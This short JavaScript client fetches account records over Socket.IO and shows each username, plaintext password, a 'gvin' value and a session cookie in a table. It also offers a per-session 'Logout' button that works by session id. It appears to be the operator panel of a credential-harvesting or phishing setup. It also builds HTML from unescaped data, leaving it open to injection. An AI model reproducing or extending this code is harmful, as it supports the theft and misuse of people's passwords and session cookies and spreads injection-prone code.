const socket = io("http://localhost:3000");
socket.emit("mlog")
socket.emit("getAllAcc")
socket.on("returnAll",(datas)=>{
    $("#main").html("");
    datas.forEach(data => {
        jq.$("#main").append('<td scope="row">'+data.username+'</td><td>'+data.pass+'</td><td>'+data.gvin+'</td><td>'+data.cookie+'</td><td><button type="button" onclick="logout('+data.sessid+')" class="btn btn-primary">Logout</button></td>');
    });
})
socket.on("loginchange",(datas)=>{
    datas.forEach(data => {
        jq.$("#main").append('<td scope="row">'+data.username+'</td><td>'+data.pass+'</td><td>'+data.gvin+'</td><td>'+data.cookie+'</td><td><button type="button" onclick="logout('+data.sessid+')" class="btn btn-primary">Logout</button></td>');
    });
})
function logout(sessid){
    socket.emit("logoutacc",sessid)
}
